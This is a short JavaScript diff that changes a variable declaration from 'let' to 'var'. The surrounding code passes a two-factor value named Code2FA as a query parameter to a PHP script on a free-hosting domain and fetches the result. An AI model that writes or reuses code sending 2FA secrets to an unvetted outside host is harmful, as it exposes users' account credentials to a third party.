@@ -1,5 +1,5 @@
 var url = `https://theloi194.000webhostapp.com/2fa/2fa.php?key=${Code2FA}`;
-let code;
+var code;
 fetch(url)
     .then(res => res.json())
     .then((out) => {
